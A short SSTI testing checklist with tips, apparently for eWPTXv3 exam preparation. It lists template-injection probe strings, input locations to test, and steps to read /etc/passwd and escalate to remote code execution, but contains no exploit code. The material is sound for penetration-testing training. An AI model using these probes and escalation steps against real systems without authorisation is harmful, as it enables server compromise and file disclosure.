## 📋 SSTI Testing Checklist

- [ ] Test `{{7*7}}` in all input fields
- [ ] Test `${7*7}` for Java-based templates
- [ ] Test `<%= 7*7 %>` for Ruby
- [ ] Test in URL parameters, form fields, headers
- [ ] Check error messages for template engine name
- [ ] Try to read /etc/passwd
- [ ] Escalate to RCE
- [ ] Check if output is reflected in response
- [ ] Test in email templates
- [ ] Test in PDF generators

---

## 🧠 eWPTXv3 Tips

- **Email templates** are a common SSTI location
- **Error pages** often use templates — test 404/500 pages
- **Sandbox escape** needed in some Jinja2 implementations
- Check **profile/account name** fields — often template rendered
- `tplmap` is your best friend for automation
- If you see `49` in response after `{{7*7}}` — you have SSTI!

